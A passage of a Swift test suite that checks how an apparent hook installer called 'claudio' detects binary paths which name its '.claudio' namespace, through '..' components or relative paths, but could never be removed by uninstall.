            + " never claimed it could sweep such an entry — and HookStatusSuite's stale-namespace"
            + " coverage installs a `.claudio-OLD` hook through the real API on purpose"
    ) {
        for path in [
            "/usr/local/bin/claudio",
            "/Users/tester/.claudio-OLD/bin/claudio",
            "/Users/tester/bin/claudio",
            // A `..` ABOVE any namespace: still no `.claudio` component, so still the carve-out.
            // Pins that the guard keys off naming the namespace, not off `..` alone.
            "/usr/local/../bin/claudio",
        ] {
            expect(
                claudioNamespaceRoot(forBinaryPath: path) == nil,
                "sanity: \(path) names no root")
            expect(
                !binaryPathContradictsItsNamespace(path),
                "\(path) names no namespace, so there is nothing for it to contradict")
        }
    }

    suite(
        "binaryPathContradictsItsNamespace: a path that NAMES our namespace but whose root"
            + " claudioNamespaceRoot refuses to derive — a `..` component, or a relative path — is a"
            + " contradiction, not the no-namespace carve-out. Both shapes reach a real binary"
            + " through /bin/sh, so the hook they write FIRES; both are rejected outright by"
            + " isClaudioBinaryPath, so no uninstall can ever sweep them back out"
    ) {
        // The carve-out's justification is "uninstall fail-closes and never claimed it could sweep
        // this entry" — true for `/usr/local/bin/claudio`, which lives outside every namespace.
        // It does NOT hold for a path that lexically contains `.claudio`: uninstall is *supposed*
        // to own that subtree, and here it silently cannot.
        let contradictions = [
            // Resolves back INSIDE the root — the exact shape matchedClaudioEvent rejects
            // fail-closed (see "any `..` component is rejected outright" above), which is what
            // makes the entry unsweepable rather than merely unusual.
            "\(testRoot)/bin/../bin/claudio",
            // Resolves OUTSIDE the root, via a `..` that lands back on `.claudio` by name.
            "\(testRoot)/../.claudio/bin/claudio",
            // `..` before the basename: `/Users/tester/claudio`, outside the namespace entirely.
            "\(testRoot)/../claudio",
            // Relative paths name the namespace too, and are equally unsweepable: the matcher's
            // root gate requires an absolute root, so nothing anchored at one can ever match them.
            ".claudio/bin/claudio",
            "Users/tester/.claudio/bin/claudio",
        ]
        for path in contradictions {
            expect(
                claudioNamespaceRoot(forBinaryPath: path) == nil,
                "premise: claudioNamespaceRoot bails on \(path), which is why the old guard read it"
                    + " as the no-namespace carve-out")
            expect(
                binaryPathContradictsItsNamespace(path),
                "\(path) names our namespace but no uninstall can sweep it; install must refuse it")
            // The stranding is real, not theoretical: the writer WOULD emit a working command...
            let written = claudioHookCommand(for: .stop, claudioBinaryPath: path)
            expect(
                written.contains(path),
                "premise: the writer emits \(path) verbatim (no metacharacter to quote), got"
                    + " \"\(written)\"")
            // ...and uninstall, anchored at the REAL production root, refuses to match it — so the
            // entry outlives every `claudio uninstall` the user will ever run.
            expect(
                matchedClaudioEvent(inHookCommand: written, claudioRoot: testRoot) == nil,
                "the guard's premise: \"\(written)\" is unmatchable even from the true root")
        }

        // `..` inside the root only ever *widens* the unsweepable set, never narrows it: the
        // canonical path stays acceptable.
        expect(
            !binaryPathContradictsItsNamespace(canonicalPath),
            "the canonical path must remain installable")
    }
}
